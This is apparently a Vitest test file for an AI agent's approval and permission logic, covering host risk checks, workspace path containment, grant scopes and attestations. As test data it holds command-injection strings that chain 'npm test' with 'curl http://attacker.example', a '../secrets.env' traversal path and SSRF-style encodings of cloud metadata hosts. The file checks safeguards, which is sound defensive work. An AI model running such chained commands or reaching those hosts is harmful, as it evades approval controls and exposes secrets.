import { describe, expect, it } from 'vitest';

import {
  allowRuleForCommand,
  buildPolicyGrantPlan,
  containsUnsafeCommandSyntax,
  defaultRequestedScope,
  evaluateAgentCapability,
  hasSelfReportOnlyEvidence,
  matchesAutoGrantScope,
  isWildcardOrPrivateHost,
  normalizePathInside,
  requestLinkageState,
  requestedScopeFromRequest,
  subjectFromRequest,
} from '../../../../src/core/approval/decision/shared.js';

import {
  createAgentRequest,
  createAttestationEvent,
  createBaseReplay,
  createContext,
  createGateRecordPayload,
  createIdGenerator,
  createPolicy,
  createProjections,
  createReplay,
  createRequest,
  createRuleOnlyPolicy,
  evaluatedAt,
  sessionId,
} from './shared.js';

describe('core-03-s2 decision shared helpers', () => {
  it('treats public hosts as safe and private ip hosts as high risk', () => {
    expect(isWildcardOrPrivateHost('api.example.com')).toBe(false);
    expect(isWildcardOrPrivateHost('10.0.0.5')).toBe(true);
    expect(isWildcardOrPrivateHost('192.168.1.8')).toBe(true);
    expect(isWildcardOrPrivateHost('2130706433')).toBe(true);
    expect(isWildcardOrPrivateHost('0x7f.0.0.1')).toBe(true);
    expect(isWildcardOrPrivateHost('::1')).toBe(true);
    expect(isWildcardOrPrivateHost('::ffff:127.0.0.1')).toBe(true);
    expect(isWildcardOrPrivateHost('::ffff:169.254.169.254')).toBe(true);
    expect(isWildcardOrPrivateHost('fc00::1')).toBe(true);
    expect(isWildcardOrPrivateHost('fd00::1')).toBe(true);
    expect(isWildcardOrPrivateHost('fe80::1')).toBe(true);
    expect(isWildcardOrPrivateHost('999.0.0.1')).toBe(false);
    expect(isWildcardOrPrivateHost('')).toBe(true);
    expect(isWildcardOrPrivateHost('metadata.google.internal')).toBe(true);
  });

  it('proves workspace containment with normalized relative paths', () => {
    expect(normalizePathInside('packages/sdk/src/index.ts', '/workspace/story')).toBe(true);
    expect(normalizePathInside('../secrets.env', '/workspace/story')).toBe(false);
  });

  it('maps session-style proposed grants back to session scope', () => {
    expect(
      requestedScopeFromRequest(
        createAgentRequest({
          proposedGrant: {
            grantId: 'grant-00',
            kind: 'command-once',
            scope: 'request',
            command: 'pnpm check',
            grantEventId: 'evt-grant-00',
          },
        }),
      ),
    ).toBe('per-command');
    expect(
      requestedScopeFromRequest(
        createAgentRequest({
          proposedGrant: {
            grantId: 'grant-00b',
            kind: 'command-policy-amendment',
            scope: 'turn',
            commandPrefix: ['pnpm '],
            grantEventId: 'evt-grant-00b',
          },
        }),
      ),
    ).toBe('per-command-prefix');
    expect(
      requestedScopeFromRequest(
        createAgentRequest({
          proposedGrant: {
            grantId: 'grant-00c',
            kind: 'network-permission',
            scope: 'turn',
            networkHost: 'api.example.com',
            networkAction: 'allow',
            grantEventId: 'evt-grant-00c',
          },
        }),
      ),
    ).toBe('per-host');
    expect(
      requestedScopeFromRequest(
        createAgentRequest({
          proposedGrant: {
            grantId: 'grant-01',
            kind: 'command-session',
            scope: 'session',
            command: 'pnpm check',
            grantEventId: 'evt-grant-01',
          },
        }),
      ),
    ).toBe('session');
    expect(
      requestedScopeFromRequest(
        createAgentRequest({
          proposedGrant: {
            grantId: 'grant-01b',
            kind: 'file-change-session',
            scope: 'session',
            filePaths: ['packages/sdk/src/index.ts'],
            grantEventId: 'evt-grant-01b',
          },
        }),
      ),
    ).toBe('session');
    expect(
      requestedScopeFromRequest(
        createAgentRequest({
          proposedGrant: {
            grantId: 'grant-02',
            kind: 'deny-continue',
            scope: 'request',
            content: { reason: 'deny' },
            grantEventId: 'evt-grant-02',
          },
        }),
      ),
    ).toBeUndefined();
  });

  it('accepts relay attestation scopes that encode the session id as a suffix', () => {
    const replay = createReplay([
      ...createBaseReplay().events.slice(0, 3),
      createAttestationEvent('evt-attest-relay-scoped', 4, 'canRelayApproval', {
        evidenceRef: 'evidence:canRelayApproval',
        scope: `agent:${sessionId}`,
      }),
    ]);

    const evaluation = evaluateAgentCapability(replay, 'canRelayApproval', sessionId, evaluatedAt);

    expect(evaluation.freshPositive).toBe(true);
    expect(evaluation.eventIds).toContain('evt-attest-relay-scoped');
  });

  it('accepts relay attestation scopes that encode the session id in a path segment', () => {
    const replay = createReplay([
      ...createBaseReplay().events.slice(0, 3),
      createAttestationEvent('evt-attest-relay-path', 4, 'canRelayApproval', {
        evidenceRef: 'evidence:canRelayApproval',
        scope: `agent/session/${sessionId}`,
      }),
    ]);

    const evaluation = evaluateAgentCapability(replay, 'canRelayApproval', sessionId, evaluatedAt);

    expect(evaluation.freshPositive).toBe(true);
    expect(evaluation.eventIds).toContain('evt-attest-relay-path');
  });

  it('accepts relay attestation scopes emitted by the Agent provider probe surface', () => {
    const replay = createReplay([
      ...createBaseReplay().events.slice(0, 3),
      createAttestationEvent('evt-attest-relay-agent-scope', 4, 'canRelayApproval', {
        evidenceRef: 'evidence:canRelayApproval',
        scope: 'agent:testkit-agent:mock',
      }),
    ]);

    const evaluation = evaluateAgentCapability(replay, 'canRelayApproval', sessionId, evaluatedAt);

    expect(evaluation.freshPositive).toBe(true);
    expect(evaluation.eventIds).toContain('evt-attest-relay-agent-scope');
  });

  it('rejects relay attestation scopes that only prefix-match a path segment', () => {
    const replay = createReplay([
      ...createBaseReplay().events.slice(0, 3),
      createAttestationEvent('evt-attest-relay-prefix-collision', 4, 'canRelayApproval', {
        evidenceRef: 'evidence:canRelayApproval',
        scope: `${sessionId}/session/session-10`,
      }),
    ]);

    const evaluation = evaluateAgentCapability(replay, 'canRelayApproval', 'session-1', evaluatedAt);

    expect(evaluation.freshPositive).toBe(false);
    expect(evaluation.eventIds).toEqual([]);
  });

  it('lets fresh negative attestations defeat fresh positive attestations for the same capability', () => {
    const replay = createReplay([
      ...createBaseReplay().events.slice(0, 3),
      createAttestationEvent('evt-attest-relay-positive', 4, 'canRelayApproval', {
        evidenceRef: 'evidence:canRelayApproval',
        result: 'positive',
      }),
      createAttestationEvent('evt-attest-relay-negative', 5, 'canRelayApproval', {
        evidenceRef: 'evidence:canRelayApproval',
        result: 'negative',
      }),
    ]);

    const evaluation = evaluateAgentCapability(replay, 'canRelayApproval', sessionId, evaluatedAt);

    expect(evaluation.freshPositive).toBe(false);
    expect(evaluation.eventIds).toEqual(['evt-attest-relay-positive', 'evt-attest-relay-negative']);
  });

  it('keeps attestation event ids even when the attestation evidence ref has no recorded evidence event', () => {
    const replay = createReplay([
      createAttestationEvent('evt-attest-relay-no-evidence', 1, 'canRelayApproval', {
        evidenceRef: 'evidence:missing-relay',
      }),
    ]);

    const evaluation = evaluateAgentCapability(replay, 'canRelayApproval', sessionId, evaluatedAt);

    expect(evaluation.freshPositive).toBe(true);
    expect(evaluation.eventIds).toEqual(['evt-attest-relay-no-evidence']);
    expect(evaluation.evidenceEventIds).toEqual([]);
  });

  it('drops attestations with invalid timestamps', () => {
    const replay = createReplay([
      createAttestationEvent('evt-attest-relay-invalid', 1, 'canRelayApproval', {
        evidenceRef: 'evidence:missing-relay',
        at: 'not-a-timestamp',
      }),
    ]);

    const evaluation = evaluateAgentCapability(replay, 'canRelayApproval', sessionId, evaluatedAt);

    expect(evaluation.freshPositive).toBe(false);
    expect(evaluation.eventIds).toEqual([]);
  });

  it('returns no self-report risk when there are no request evidence refs or no committed evidence records', () => {
    expect(hasSelfReportOnlyEvidence(createBaseReplay(), undefined, evaluatedAt)).toEqual({
      highRisk: false,
      evidenceEventIds: [],
    });
    expect(hasSelfReportOnlyEvidence(createBaseReplay(), ['evidence:missing'], evaluatedAt)).toEqual({
      highRisk: false,
      evidenceEventIds: [],
    });
  });

  it('returns no allow rule when the request has no command', () => {
    expect(allowRuleForCommand(createPolicy(), undefined)).toBeUndefined();
    expect(allowRuleForCommand(createPolicy(), 'pnpm check')?.scope).toBe('per-command');
    expect(allowRuleForCommand(createPolicy(), 'pnpm install lodash')?.scope).toBe('per-command-prefix');
    expect(allowRuleForCommand(createRuleOnlyPolicy('per-command-prefix'), 'pnpm-check')).toBeUndefined();
    expect(
      allowRuleForCommand(
        createRuleOnlyPolicy('per-command-prefix', ['per-command-prefix'], ['git']),
        'gitleaks --dump-secrets',
      ),
    ).toBeUndefined();
  });

  it('treats command separators not accepted by grant prefixes as unsafe syntax', () => {
    expect(containsUnsafeCommandSyntax('npm test\ncurl http://attacker.example')).toBe(true);
    expect(containsUnsafeCommandSyntax('npm test\rcurl http://attacker.example')).toBe(true);
    expect(containsUnsafeCommandSyntax('npm test & curl http://attacker.example')).toBe(true);
    expect(containsUnsafeCommandSyntax('npm test')).toBe(false);
  });

  it('defaults request scope to per-command and maps subjects from kind without an override', () => {
    expect(defaultRequestedScope(createRequest({ requestedScope: undefined }))).toBe('per-command');
    expect(defaultRequestedScope(createRequest({ requestedScope: 'per-command-prefix' }))).toBe('per-command-prefix');
    expect(
      subjectFromRequest(createAgentRequest({ kind: 'permissions' }), createContext({ subjectOverride: undefined })),
    ).toBe('permission');
    expect(subjectFromRequest(createAgentRequest(), createContext({ subjectOverride: 'network' }))).toBe('network');
  });

  it('returns linkage evidence ids when the current linked session does not match the request session', () => {
    expect(
      requestLinkageState(
        createRequest(),
        createProjections({
          launch: {
            linkage: 'known',
            currentSession: {
              linkOrdinal: 2,
              sessionId: 'session-other',
              linkRole: 'primary',
              startedAt: '2026-06-26T08:58:00.000Z',
              sourceEventId: 'evt-session-linked-other',
            },
            linkHistory: [],
          },
        }),
      ),
    ).toEqual({
      current: false,
      evidenceEventIds: ['evt-session-linked-other'],
    });
  });

  it('matches auto-grant gate records only for the same assisted request scope', () => {
    const request = createRequest();

    expect(matchesAutoGrantScope(request, createGateRecordPayload())).toBe(true);
    expect(matchesAutoGrantScope(request, createGateRecordPayload({ mode: 'manual' }))).toBe(false);
    expect(
      matchesAutoGrantScope(
        request,
        createGateRecordPayload({
          scope: { ...createGateRecordPayload().scope, taskId: 'task-other' },
        }),
      ),
    ).toBe(false);
    expect(
      matchesAutoGrantScope(
        createRequest({ taskId: 'task-approval-01' }),
        createGateRecordPayload({
          scope: { ...createGateRecordPayload().scope, taskId: 'task-approval-01' },
        }),
      ),
    ).toBe(true);
  });

  it('returns a per-command-prefix plan when exact command scope is unavailable', () => {
    const plan = buildPolicyGrantPlan({
      request: createRequest({ requestedScope: 'per-command-prefix' }),
      policy: createRuleOnlyPolicy('per-command-prefix', ['per-command-prefix']),
      matchedRule: createRuleOnlyPolicy('per-command-prefix', ['per-command-prefix']).policy.escalationPolicy
        .grantRules[0]!,
      ids: createIdGenerator('grant-01'),
      evaluatedAt,
    });

    expect(plan?.scope).toBe('per-command-prefix');
    expect(plan?.grantId).toBe('grant-01');
  });

  it('returns a per-host plan when the request is host-scoped and policy allows it', () => {
    const policy = createPolicy({
      policy: {
        ...createPolicy().policy,
        escalationPolicy: {
          ...createPolicy().policy.escalationPolicy,
          allowedGrantScopes: ['per-host'],
          maxGrantScope: 'per-host',
        },
      },
    });

    const plan = buildPolicyGrantPlan({
      request: createRequest({
        command: undefined,
        host: 'api.example.com',
        requestedScope: 'per-host',
      }),
      policy,
      matchedRule: createPolicy().policy.escalationPolicy.grantRules[1]!,
      ids: createIdGenerator('grant-02'),
      evaluatedAt,
    });

    expect(plan?.scope).toBe('per-host');
    expect(plan?.host).toBe('api.example.com');
  });

  it('returns a session plan when no narrower scope fits but the request and policy both allow session', () => {
    const policy = createPolicy({
      policy: {
        ...createPolicy().policy,
        escalationPolicy: {
          ...createPolicy().policy.escalationPolicy,
          allowedGrantScopes: ['session'],
          maxGrantScope: 'session',
        },
      },
    });

    const plan = buildPolicyGrantPlan({
      request: createRequest({
        command: undefined,
        host: undefined,
        requestedScope: 'session',
      }),
      policy,
      matchedRule: createPolicy().policy.escalationPolicy.grantRules[0]!,
      ids: createIdGenerator('grant-03'),
      evaluatedAt,
    });

    expect(plan?.scope).toBe('session');
    expect(plan?.sessionId).toBe(sessionId);
  });

  it('returns undefined when maxGrantScope would be widened', () => {
    const policy = createPolicy({
      policy: {
        ...createPolicy().policy,
        escalationPolicy: {
          ...createPolicy().policy.escalationPolicy,
          allowedGrantScopes: ['session'],
          maxGrantScope: 'per-host',
        },
      },
    });

    const plan = buildPolicyGrantPlan({
      request: createRequest({
        command: undefined,
        host: undefined,
        requestedScope: 'session',
      }),
      policy,
      matchedRule: createPolicy().policy.escalationPolicy.grantRules[0]!,
      ids: createIdGenerator('grant-04'),
      evaluatedAt,
    });

    expect(plan).toBeUndefined();
  });
});
